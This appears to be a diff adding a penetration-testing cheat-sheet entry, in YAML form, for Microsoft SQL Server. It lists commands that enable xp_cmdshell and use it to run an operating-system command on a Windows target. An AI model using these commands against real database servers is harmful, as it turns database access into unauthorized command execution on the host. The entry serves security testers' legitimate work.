@@ -1,0 +1,14 @@
+name:  mssql-exec
+tags: [mssql,xpcmdshell,exec]
+data: |
+  plateform/windows #target/local
+  
+  SQL Server xpcmdshell
+
+  ```
+    EXEC sp_configure 'show advanced option', 1
+    EXEC sp_configure reconfigure
+    EXEC sp_configure 'xp_cmdshell', 1
+    EXEC sp_configure reconfigure
+    EXEC master.dbo.xp_cmdshell 'whoami'
+  ```
